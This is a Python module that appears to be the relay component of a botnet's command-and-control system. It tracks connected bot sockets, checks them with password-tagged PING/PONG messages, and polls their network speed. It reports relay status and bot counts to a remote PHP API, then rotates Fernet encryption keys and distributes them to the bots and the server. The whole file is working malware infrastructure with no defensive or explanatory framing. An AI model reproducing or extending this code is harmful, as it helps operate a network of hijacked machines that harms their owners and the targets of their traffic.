import time
from requests import get as rget
from socket import socket as Sock
from cryptography.fernet import Fernet
from colorama import Fore
from .config import RelayConfig

class Loops():
    def __init__(
        self, 
        config: RelayConfig = RelayConfig()
    ) -> None:
        self.config = config
        
    def log(
        self,
        data: str,
    ) -> None: 
        if self.config.debug: print(data)
        
    def crypt(
        self,
        msg: str,
        encrypt: bool = True,
    ) -> bytes:
        if encrypt: msg = self.config.fernet.encrypt(msg)
        else: msg = self.config.fernet.decrypt(msg)

        return msg

    def relay_api(
        self,
        data: dict,
        act: bool,
    ) -> bool:
        ip: str = data['ip']
        bots = data['bots']

        url: str = f"{self.config.API_URL}/relays.php?urlkey={self.config.URL_KEY}&ip={ip}&bots={bots}&act={act}"

        try:
            res: str = rget(url, timeout=5000).json()
            return res == "ok"

        except Exception as e:
            self.log(f"error \n{url}\n{e}\n\n")
            return False

    def send(
        self,
        s: Sock,
        data: str,
        escape=True,
        reset=True,
    ) -> None:
        if reset: data += self.config.COLOR_RESET
        if escape: data += '\r\n'

        s.send(data.encode())

    def ping(self) -> None:
        while 1:
            for bot in self.config.bots:
                try:
                    bot.settimeout(3)
                    self.send(bot, 'PING', False, False)

                    data: str = bot.recv(1024).decode()

                    if data != f'PONG[p:{self.config.PASSWD}]':
                        self.config.bots.pop(bot)
                        bot.close()

                except Exception:
                    self.config.bots.pop(bot)
                    bot.close()

            time.sleep(self.config.relay_time.PING)

    def net(self) -> None:
        while 1:
            self.config.speed.clear()

            for bot in self.config.bots:
                try:
                    bot.settimeout(3)
                    self.send(bot, f'NETSPEED', False, False)

                    data: str = bot.recv(1024).decode()

                    try:
                        if not int(data):
                            self.config.bots.pop(bot)
                            bot.close()
                            continue

                        self.config.speed.append(int(data))

                    except Exception:
                        self.config.bots.pop(bot)
                        bot.close()

                except Exception:
                    self.config.bots.pop(bot)
                    bot.close()

            time.sleep(self.config.relay_time.NET)



    def api_key(self, gkey: str):
        url=f"{self.config.API_URL}/genkey.php?urlkey={self.config.URL_KEY}&gkey={gkey}"
        try:
            res = rget(url, timeout=5000).json()
            self.log(res)

            return res == "ok"

        except Exception as e:
            self.log(f"error \n{url}\n{e}\n\n")
            return False



    def genkey(self) -> None:
        while 1:
            time.sleep(self.config.relay_time.GENKEY)
            self.config.gen_key.clear()

            ngkey=Fernet.generate_key().decode()
            self.log(ngkey)
            self.config.gen_key.append(ngkey)

            k: list = []
            ke: list = []

            if self.config.old_gen_key != []:
                f: Fernet = Fernet(self.config.old_gen_key[0])
                k.append(f.encrypt(f'GKEY:[{ngkey}]'.encode()).decode())

                for i in k:
                    if self.api_key(i): self.log("apikey op")
                    else: self.log("apikey error")
            else:
                ke.append(self.crypt(f'GKEY:[{ngkey}]'.encode()).decode())
                for i in ke:
                    if self.api_key(i): self.log("apikey op")
                    else: self.log("apikey error")

            for bot in self.config.bots:
                try:
                    bot.settimeout(3)
                    if k != []:
                        for i in k: self.send(bot, i, False, False)

                    elif ke != []:
                        for i in ke: self.send(bot, f"GK{i}", False, False)

                    else: self.log("error")

                except Exception:
                    self.config.bots.pop(bot)
                    bot.close()
